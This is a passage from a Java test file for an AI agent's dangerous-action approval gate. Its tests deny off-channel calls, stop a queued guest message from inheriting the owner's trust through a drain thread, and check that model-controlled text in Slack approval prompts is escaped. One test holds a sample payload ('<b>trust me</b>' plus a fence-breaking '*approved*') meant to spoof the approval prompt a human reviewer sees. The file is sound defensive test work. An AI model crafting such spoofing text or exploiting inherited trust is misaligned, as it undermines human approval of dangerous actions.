        var agent = boundAgent("gate-owner-deny");
        var convId = telegramConvId(agent);
        ConfigService.set(DangerousActionGate.CFG_OFF_CHANNEL_POLICY, "deny");
        try {
            var decision = DangerousActionGate.withOwnerInitiated(true,
                    () -> DangerousActionGate.guard(agent, convId, DANGEROUS_TOOL,
                            "{\"command\":\"echo mine\"}"));
            assertEquals(Decision.ABORT, decision);
        }
        finally {
            ConfigService.set(DangerousActionGate.CFG_OFF_CHANNEL_POLICY, "allow");
        }
    }

    // ── JCLAW-1226: the drain thread must not inherit the finishing turn's trust. ──

    @Test
    void aDrainedGuestMessageIsNotTheOwner() throws Exception {
        // The queue drain forks from the turn that just finished, but re-processes whoever
        // else's message was waiting. Thread.Builder inherits InheritableThreadLocals by
        // default, so OWNER_INITIATED used to cross that fork and wave the guest through.
        var agent = boundAgent("gate-drain-guest");
        var convId = telegramConvId(agent);
        var verdict = new java.util.concurrent.CompletableFuture<Decision>();

        DangerousActionGate.withOwnerInitiated(true, () ->
                QueueDrainOrchestrator.startDrainThread(() -> verdict.complete(
                        DangerousActionGate.guard(agent, convId, DANGEROUS_TOOL,
                                "{\"command\":\"echo queued\"}"))));

        TelegramApprovalService.resolve(awaitPromptAndExtractId(),
                TelegramApprovalCallback.Decision.DENY, TG_USER);
        assertEquals(Decision.ABORT, verdict.get(2, TimeUnit.SECONDS),
                "a drained message must be gated on its own sender, not the finished turn's");
    }

    @Test
    void slackApprovalPromptEscapesModelControlledText() throws Exception {
        // JCLAW-1231: the Telegram prompt escaped the tool name, the why line and the args;
        // the Slack one escaped nothing. Its grammar is mrkdwn, not HTML — and args inside
        // the fence must not be able to close it and render as formatting.
        var buildSlackPrompt = DangerousActionGate.class.getDeclaredMethod(
                "buildSlackPrompt", String.class, String.class);
        buildSlackPrompt.setAccessible(true);
        var args = "{\"why\":\"<b>trust me</b>\",\"cmd\":\"echo ```*approved*\"}";

        var prompt = (String) buildSlackPrompt.invoke(null, "exec<&>", args);

        assertFalse(prompt.contains("<b>"), "Slack control characters must be escaped: " + prompt);
        assertTrue(prompt.contains("&lt;b&gt;"), "the why line must be escaped too: " + prompt);
        assertTrue(prompt.contains("exec&lt;&amp;&gt;"), "the tool name must be escaped: " + prompt);
        assertEquals(2, prompt.split(Pattern.quote("```"), -1).length - 1,
                "only the opening and closing fence may survive, or the args escape the block: " + prompt);
    }
}
